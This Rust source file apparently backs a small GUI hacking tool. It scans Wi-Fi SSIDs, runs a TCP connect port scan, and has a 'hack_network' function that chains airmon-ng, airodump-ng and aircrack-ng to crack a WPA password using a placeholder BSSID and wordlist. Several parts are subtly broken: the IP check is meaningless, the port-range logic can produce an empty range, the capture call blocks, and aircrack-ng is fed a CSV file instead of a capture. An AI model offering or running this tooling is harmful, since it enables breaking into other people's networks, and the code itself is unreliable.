use tokio::net::TcpStream;
use std::{i32, ops::Range};
use wifi_scanner;
use std::process::Command;

pub fn my_ip(a:String)->bool{
    let chunks=a.split(".");
    if chunks.count()<5{true}else{false}
}
pub async fn scan_networks()->Vec<slint::StandardListViewItem>{
    let mut f=vec![];
    let scans=match wifi_scanner::scan() {
        Ok(wifi)=>wifi,
        Err(_)=>vec![]
    };

    for w in scans{
        f.push(slint::StandardListViewItem::from(w.ssid.to_string().as_str()));
    }
    f
}

pub async fn hack_network(){
    println!("Hacking Network");
    // Set the interface name (e.g., wlan0)
    let interface = "wlan0";

    // Set the channel number
    let channel = 1;

    // Start monitoring mode
    Command::new("airmon-ng")
        .arg("start")
        .arg(interface)
        .output()
        .expect("Failed to start monitoring mode");

    // Start capturing packets
    Command::new("airodump-ng")
        .arg("-c")
        .arg(channel.to_string())
        .arg("-w")
        .arg("capture")
        .arg("--output-format")
        .arg("csv")
        .arg(interface)
        .output()
        .expect("Failed to capture packets");

    // Crack the WEP/WPA/WPA2 password
    Command::new("aircrack-ng")
        .arg("-a")
        .arg("2")
        .arg("-b")
        .arg("00:11:22:33:44:55") // BSSID
        .arg("-w")
        .arg("/path/to/wordlist")
        .arg("capture-01.csv")
        .output()
        .expect("Failed to crack password");
}

pub async fn scan_port(a:String,ra:String,rb:String)->Vec<slint::StandardListViewItem>{
    let mut f=vec![];
    let sp=match ra.parse::<i32>(){Ok(num)=>num,Err(_)=>0};
    let tp=match rb.parse::<i32>(){Ok(num)=>num,Err(_)=>0};
    let p_r:Range<i32>=if sp>1 && tp<sp{sp..tp}else{1..3000};

    for i in p_r{
        match TcpStream::connect(format!("{a}:{i}")).await{
            Ok(v)=>{if v.peer_addr().is_ok(){f.push(slint::StandardListViewItem::from(i.to_string().as_str()))}},
            Err(e)=>{println!("Can't connect{e}")}
        };

    }
    f
}
